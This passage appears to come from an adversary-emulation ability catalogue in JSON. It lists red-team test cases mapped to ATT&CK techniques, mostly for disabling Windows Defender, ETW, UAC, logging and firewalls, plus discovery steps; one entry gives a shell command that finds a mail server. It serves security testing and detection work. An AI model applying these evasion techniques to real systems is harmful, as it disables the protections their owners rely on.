        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "64ccf7cd4358a0540ab51c8015c1b744",
        "technique_id": "T1497.001",
        "repeatable": false
    },
    {
        "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Indicator Blocking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable .NET Event Tracing for Windows Via Registry (cmd)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "21a279cb142da9bc65cd4a19bef7a2d2",
        "technique_id": "T1562.006",
        "repeatable": false
    },
    {
        "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Indicator Blocking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable .NET Event Tracing for Windows Via Registry (powershell)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8beb34c915b17873e357c030d517be0a",
        "technique_id": "T1562.006",
        "repeatable": false
    },
    {
        "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Administrative Share Creation at Startup",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fa93e59e1418d91ce03418913ca80fa7",
        "technique_id": "T1070.005",
        "repeatable": false
    },
    {
        "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Arbitrary Security Windows Service",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8b71e899ab6e719d4ce6e0f7c9ac85ca",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Defender Using NirSoft AdvancedRun",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "4166b6cb546ee537c916c1f864f1294b",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Attempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Defender with Defender Control",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "be62caa4ce347cdfc7122ada8ca9d513",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Windows Event Logging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Event Logging with wevtutil",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7b7c4e56566e5c917c5e0bbaaef4f1c5",
        "technique_id": "T1562.002",
        "repeatable": false
    },
    {
        "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Hypervisor-Enforced Code Integrity (HVCI)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b97004a5d9c4283b6085ddf3ff0d6b4c",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Microsoft Defender Firewall",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5b93df032e230056c21a3e57334f77d1",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Microsoft Defender Firewall via Registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8fe59e288f10a486dc8b44bc872019ff",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Microsoft Office Security Features",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b66a6eed7d46ab2ca4c3bf1ae3b61f44",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Indicator Blocking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Powershell ETW Provider - Windows",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "efe119524cf6e6b760c6e9ebe83bf107",
        "technique_id": "T1562.006",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable System Restore Through Registry",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "c8f329d2847ede593b6cb4a1ec6120fb",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e7d20e7f0087f8a4234c1d1b7a228bb0",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable UAC using reg.exe",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "3a67bc42e7f567d9faffab9af37afa72",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Win Defender Notification",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "609ae2466dfa661ac22a8d3a1c15d16a",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Auto Reboot for current logon user",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "96030a3a84fc75385362f617843bb1ef",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows CMD application",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "86993ae14d75a6da421c0d98c3facd61",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Change Password Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a713f8a033268f0b923012f527067640",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Disable Windows Defender All",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "Elevated",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Defender All",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "b007f6e8-4a87-4440-8888-29ceab047d9b",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Disable Windows Defender Real-Time Protection",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "Elevated",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Defender Real-Time Protection",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "49470433-30ce-4714-a44b-bea9dbbeca9a",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Defender with DISM",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "93b4f004682dfb6d1af15e01c2859f93",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "afae914d4839d5194835d8475604e7b8",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Error Reporting Settings",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e56b118fad900831f15bd550b5a5914a",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Windows Event Logging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows IIS HTTP Logging",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bc5d26cf7201f1504b495ca2c1758ebf",
        "technique_id": "T1562.002",
        "repeatable": false
    },
    {
        "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Windows Event Logging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows IIS HTTP Logging via PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7a0717485ca13c441d26bfaaa5c92535",
        "technique_id": "T1562.002",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Lock Workstation Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e3f2eac83f7f8148e53b9f2213830e44",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows LogOff Button",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "288a78bcbdc978bf78ee6d4f43b98442",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Notification Center",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a8413387ed0d47a4fbd1bdf21359ebc6",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows OS Auto Update",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "cb09dc16561713bc4558c54d42c6d513",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Registry Tool",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ba862ef17f5b9e438915d1cf33abf60a",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Security Center Notifications",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ef55deab0893319b07802b4d4bd1f38c",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Shutdown Button",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f756cf55128c32328f50443164ecaea6",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Task Manager application",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "237eeedec47b5899d497fa1803ae4028",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Windows Toast Notifications",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "11a7fa65413753907dc69ac37db54798",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DisallowRun Execution Of Certain Applications",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0bc2cabb6dbb0a6be7e9436f0107b574",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover Domain Admins",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "6d90e6fa-9324-4eb5-93be-9f737245bd7z",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Identify the organizations mail server",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "target.org.emailhost",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Discover Mail Server",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover Specific Process - tasklist",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "eba68ea18bc9ac93808fffbdcf7c3a3f",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Location Discovery: System Language Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover System Language by Registry Query",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "4f978da47c3dfb3fbf98ecc3cc99c92b",
        "technique_id": "T1614.001",
        "repeatable": false
    },
    {
        "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Location Discovery: System Language Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover System Language with chcp",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f92a238fc446f89dc01f73b6c30264c3",
        "technique_id": "T1614.001",
        "repeatable": false
    },
    {
        "description": "Identify AV",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover antivirus programs",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Identify the remote domain controllers",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover domain controller",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover injectable process",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover local hosts",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify system services",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover system services",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "c6607391-d02c-44b5-9b13-d3492ca58599",
        "technique_id": "T1007",
        "repeatable": false
    },
    {
        "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DiskShadow Command Execution",
